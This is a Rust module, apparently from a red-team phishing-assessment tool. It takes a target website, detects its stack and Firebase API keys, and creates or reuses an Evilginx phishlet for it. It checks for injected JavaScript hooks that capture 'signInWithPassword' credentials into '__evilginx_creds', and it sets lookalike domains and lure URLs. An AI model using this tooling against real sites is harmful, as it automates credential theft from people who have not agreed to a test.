//! One-shot Destinations setup: site profile → detect stack → phishlet.
use std::fs;
use std::path::Path;

use serde::Serialize;
use serde_json::{json, Value};

use crate::assessment;
use crate::db::{self, Profile, UpsertProfile};
use crate::engagement::{
    default_dryrun_domain, normalize_target_host, phishlet_name_for_target, upstream_domain,
};
use crate::error::{AppError, AppResult};
use crate::kit::kit_root;
use crate::phishlet::{self, GenerateResult};
use crate::recon::{self, ReconResult, StackInfo};

#[derive(Debug, Serialize)]
pub struct EnsureDestinationResult {
    pub ok: bool,
    pub profile: Profile,
    pub detect: ReconResult,
    pub phishlet: GenerateResult,
    pub firebase_hooks: bool,
    pub message: String,
}

pub fn phishlet_has_firebase_hooks(path: &Path) -> bool {
    let Ok(text) = fs::read_to_string(path) else {
        return false;
    };
    let has_active_inject = text
        .lines()
        .any(|l| l.trim_start().starts_with("js_inject:"));
    has_active_inject && text.contains("signInWithPassword") && text.contains("__evilginx_creds")
}

fn phishlet_looks_customized(path: &Path) -> bool {
    let Ok(text) = fs::read_to_string(path) else {
        return false;
    };
    !text.contains("TARGET_DOMAIN")
        && !text.contains("PORTAL_HOST")
        && !text.contains("LOOKALIKE_DOMAIN")
}

/// Create/update a site profile and ensure a stack-matched phishlet exists.
/// Never clobbers an existing Firebase phishlet with hooks unless `overwrite`.
pub fn ensure_destination(
    target: String,
    name: Option<String>,
    overwrite: bool,
    assessment_id: Option<String>,
) -> AppResult<EnsureDestinationResult> {
    let host = normalize_target_host(&target);
    if host.is_empty() {
        return Err(AppError::msg("Enter a website URL or domain"));
    }
    let name_opt = name.map(|s| s.trim().to_string()).filter(|s| !s.is_empty());
    let display = name_opt.clone().unwrap_or_else(|| host.clone());

    let detect = recon::detect_target(&target)?;
    let gen = ensure_phishlet(&target, &detect.stack_info, overwrite)?;

    let existing = db::list_profiles()?
        .into_iter()
        .find(|p| normalize_target_host(&p.target_domain) == gen.target_domain);

    let mut auth_meta = existing
        .as_ref()
        .map(|p| p.auth_meta.clone())
        .filter(|v| v.is_object())
        .unwrap_or_else(|| json!({}));
    if let Some(k) = detect
        .stack_info
        .firebase_keys
        .first()
        .or(gen.stack_info.firebase_keys.first())
    {
        if let Some(obj) = auth_meta.as_object_mut() {
            obj.insert("firebase_api_key".into(), json!(k));
        }
    }

    let stack_val = serde_json::to_value(&gen.stack_info).unwrap_or(Value::Null);
    let resolved_assessment =
        assessment::resolve_assessment_for_target(&gen.target_domain, assessment_id)?;
    let profile_name = if name_opt.is_some() {
        display
    } else {
        existing
            .as_ref()
            .map(|p| p.name.clone())
            .filter(|n| !n.is_empty())
            .unwrap_or(display)
    };
    let profile = db::upsert_profile(UpsertProfile {
        id: existing.as_ref().map(|p| p.id.clone()),
        name: profile_name,
        phishlet: Some(gen.phishlet.clone()),
        dryrun_domain: Some(gen.dryrun_domain.clone()),
        target_domain: Some(gen.target_domain.clone()),
        lure_url: existing.as_ref().map(|p| p.lure_url.clone()),
        auth_meta: Some(auth_meta),
        stack_info: Some(stack_val),
        notes: Some(format!("stack:{}", gen.stack_info.stack)),
        assessment_id: Some(resolved_assessment),
    })?;
    let _ = db::set_active_profile(&profile.id);

    let path = kit_root()?.join(format!("kit/evilginx/phishlets/{}.yaml", gen.phishlet));
    let hooks = phishlet_has_firebase_hooks(&path);
    let message = format!(
        "{} · {} · {}",
        if gen.created { "Created" } else { "Ready" },
        gen.stack_info.label,
        gen.phishlet
    );

    Ok(EnsureDestinationResult {
        ok: true,
        profile,
        detect,
        phishlet: gen,
        firebase_hooks: hooks,
        message,
    })
}

fn ensure_phishlet(
    target: &str,
    stack_info: &StackInfo,
    overwrite: bool,
) -> AppResult<GenerateResult> {
    let root = kit_root()?;
    let host = normalize_target_host(target);
    let name = phishlet_name_for_target(&host);
    let dest = root.join(format!("kit/evilginx/phishlets/{name}.yaml"));
    let stack = stack_info.stack.as_str();

    if dest.is_file() && !overwrite {
        if phishlet_has_firebase_hooks(&dest) {
            let mut info = stack_info.clone();
            // Existing hooks are authoritative even if live recon missed modulepreload
            if info.stack == "generic_spa" {
                info.stack = "firebase".into();
                info.label = "Firebase Auth (React / SPA)".into();
            }
            if info.login_path.is_none() {
                info.login_path = Some("/login".into());
            }
            return Ok(GenerateResult {
                ok: true,
                phishlet: name,
                dryrun_domain: default_dryrun_domain(&host),
                target_domain: host.clone(),
                upstream_domain: upstream_domain(&host),
                stack_info: info,
                path: dest.display().to_string(),
                created: false,
                message: "Using existing Firebase phishlet".into(),
            });
        }
        if phishlet_looks_customized(&dest) {
            return Ok(GenerateResult {
                ok: true,
                phishlet: name,
                dryrun_domain: default_dryrun_domain(&host),
                target_domain: host.clone(),
                upstream_domain: upstream_domain(&host),
                stack_info: stack_info.clone(),
                path: dest.display().to_string(),
                created: false,
                message: "Using existing phishlet".into(),
            });
        }
    }

    if stack == "firebase" {
        let templates = phishlet::list_pattern_templates()?;
        if templates.iter().any(|t| t.id == "firebase") {
            return phishlet::scaffold_from_pattern(target, "firebase");
        }
    }
    phishlet::generate_phishlet(target, overwrite)
}
